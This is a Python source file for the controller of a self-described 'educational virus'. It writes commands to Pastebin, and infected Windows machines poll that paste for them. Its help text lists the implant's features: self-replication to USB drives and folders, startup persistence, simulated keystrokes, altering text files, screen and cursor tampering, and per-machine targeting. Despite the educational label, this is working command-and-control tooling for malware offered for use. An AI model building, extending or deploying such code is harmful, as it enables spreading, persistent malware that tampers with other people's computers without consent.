#!/usr/bin/env python3
"""
EDUCATIONAL VIRUS — Controller

Use this to send commands to infected machines.
Commands are uploaded to a paste (Pastebin, Gist, Ghostbin, etc.)
and the virus polls for updates.

Usage:
  python controller.py <paste_url> <command> [args...]

Examples:
  python controller.py https://pastebin.com/raw/XXXXX help
  python controller.py https://pastebin.com/raw/XXXXX ping
  python controller.py https://pastebin.com/raw/XXXXX popup Hello|from Controller
  python controller.py https://pastebin.com/raw/XXXXX notepad 3|You have been pranked!
  python controller.py https://pastebin.com/raw/XXXXX target:ABC123|reversetxt|C:\\Users\\Public
  python controller.py https://pastebin.com/raw/XXXXX kill

Interactive mode:
  python controller.py https://pastebin.com/raw/XXXXX --interactive
"""

import sys
import os
import json
import time
import urllib.request
import urllib.parse
import base64
import hashlib

# ==================== PASTE UPLOADERS ====================

# Since different paste services have different APIs, we'll use
# Pastebin as default and show instructions for others.

def upload_to_pastebin(text, api_key=None):
    """
    Upload to Pastebin.
    
    To get an API key:
      1. Go to https://pastebin.com/api
      2. Create a FREE account (or use existing)
      3. Get your API dev key from https://pastebin.com/doc_api
    
    Pastebin API endpoint: POST https://pastebin.com/api/api_post.php
    """
    if not api_key:
        print("[!] No Pastebin API key provided.")
        print("    Create a paste MANUALLY:")
        print("    1. Go to https://pastebin.com")
        print("    2. Paste the command below")
        print("    3. Set expiration to 'Never' or '1 Day'")
        print("    4. Click 'Create New Paste'")
        print("    5. Get the RAW URL (e.g. https://pastebin.com/raw/XXXXX)")
        return None

    data = {
        "api_option": "paste",
        "api_dev_key": api_key,
        "api_paste_code": text,
        "api_paste_private": "0",
        "api_paste_expire_date": "1D",
        "api_paste_name": f"edu-virus-{time.strftime('%H%M%S')}",
    }

    try:
        req = urllib.request.Request(
            "https://pastebin.com/api/api_post.php",
            data=urllib.parse.urlencode(data).encode(),
        )
        with urllib.request.urlopen(req, timeout=15) as resp:
            result = resp.read().decode().strip()
            # Result is a URL like https://pastebin.com/XXXXX
            # Raw URL: https://pastebin.com/raw/XXXXX
            paste_id = result.split("/")[-1]
            raw_url = f"https://pastebin.com/raw/{paste_id}"
            print(f"[✓] Paste created: {raw_url}")
        return raw_url
    except Exception as e:
        print(f"[✗] Failed to upload: {e}")
        return None

def format_command(command, args, target=None, cmd_id=None):
    """
    Format a command string for the virus to parse.
    
    JSON format (preferred):
      {"cmd":"popup","args":["Hello","World"],"id":"unique123"}
    
    Text format:
      popup|Hello|World
    
    With targeting:
      target:ABC123|popup|Hello
    """
    if not cmd_id:
        cmd_id = hashlib.md5(f"{command}:{':'.join(args)}:{time.time()}".encode()).hexdigest()[:16]

    cmd_obj = {"cmd": command, "args": args, "id": cmd_id}

    if target:
        cmd_obj["target"] = target
        return f"target:{target}|{command}|{'|'.join(args)}"

    return json.dumps(cmd_obj)

def show_help():
    """Show all available commands."""
    print("""
=== CONTROLLER — Available Commands ===

BASIC COMMANDS:
  help                        Show this help
  ping                        Show agent info (message box)
  popup <title>|<text>        Show a message box
  typer|type <text>           Simulate keystroke typing
  notepad [n]|<text>          Open Notepad windows with text

VISUAL COMMANDS:
  wallpaper [url]             Change desktop wallpaper
  restore_wallpaper           Restore original wallpaper
  flash [color]|[n]           Flash screen (color: red/green/blue/random)
  cursor [pattern]            Move cursor (spiral/square/random)

ANNOYANCE COMMANDS:
  mouse [seconds]             Jiggle mouse for N seconds
  tray open|close             Open/close CD/DVD tray
  reversetxt [folder]         Reverse .txt files (reversible via .bak)
  replicate [folder]          Copy virus to USB drives / folders

PERSISTENCE COMMANDS:
  persist                     Add to Windows startup
  unpersist                   Remove from startup

TACTICAL COMMANDS:
  target:AGENT|<cmd>|<args>   Send command to specific agent ONLY
  selfdestruct|kill           Remove all traces + delete self (IRREVERSIBLE)

TARGETING:
  Tag a command with target:AGENT_ID to only hit one machine.
  Example: target:abc123|popup|Hello|Only this PC!
  Use 'ping' to discover agent IDs.

HOW TO USE:
  1. Run the controller:
     python controller.py https://pastebin.com/raw/XXXXX <command> [args]

  2. Or use interactive mode:
     python controller.py https://pastebin.com/raw/XXXXX --interactive

  3. Manual mode:
     - Run the controller with --generate to output the command text
     - Copy it to your paste manually
""")

def interactive_mode(paste_url):
    """Interactive command console."""
    print(f"\nInteractive Controller — {paste_url}\n")
    print("Type 'help' for commands, 'exit' to quit.\n")
    show_help()

    while True:
        try:
            raw = input("edu-virus> ").strip()
        except (EOFError, KeyboardInterrupt):
            print()
            break

        if not raw:
            continue
        if raw.lower() in ("exit", "quit", "q"):
            break
        if raw.lower() == "help":
            show_help()
            continue

        # Parse the input
        parts = raw.split()
        cmd = parts[0]
        args = parts[1:] if len(parts) > 1 else []
        cmd_text = format_command(cmd, args)

        print()
        print("Command to paste:")
        print("-" * 50)
        print(cmd_text)
        print("-" * 50)
        print(f"\nPaste this into: {paste_url}")
        print()

def main():
    if len(sys.argv) < 2 or sys.argv[1] in ("-h", "--help"):
        show_help()
        sys.exit(0)

    paste_url = sys.argv[1]

    # Interactive mode
    if "--interactive" in sys.argv or "-i" in sys.argv[1:]:
        interactive_mode(paste_url)
        return

    # Generate mode — just output the command text
    if "--generate" in sys.argv or "-g" in sys.argv[1:]:
        cmd = sys.argv[2]
        args = sys.argv[3:]
        cmd_text = format_command(cmd, args)
        print(cmd_text)
        return

    # Direct mode — output the command for manual paste
    if len(sys.argv) >= 3:
        cmd = sys.argv[2]
        args = sys.argv[3:]
        cmd_text = format_command(cmd, args)

        print("=" * 50)
        print(f"EDUCATIONAL VIRUS — COMMAND")
        print("=" * 50)
        print()
        print(f"Paste URL:  {paste_url}")
        print(f"Command:    {cmd}")
        print(f"Args:       {' | '.join(args) if args else '(none)'}")
        print(f"Agent ID:   {'ALL (broadcast)' if 'target:' not in cmd else cmd.split('|')[0].replace('target:', '')}")
        print()
        print("--- COPY BELOW THIS LINE ---")
        print(cmd_text)
        print("--- COPY ABOVE THIS LINE ---")
        print()
        print(f"[*] Go to {paste_url}")
        print("[*] Replace the ENTIRE paste content with the command above")
        print("[*] Virus will pick it up within the poll interval")
        return

    show_help()

if __name__ == "__main__":
    main()
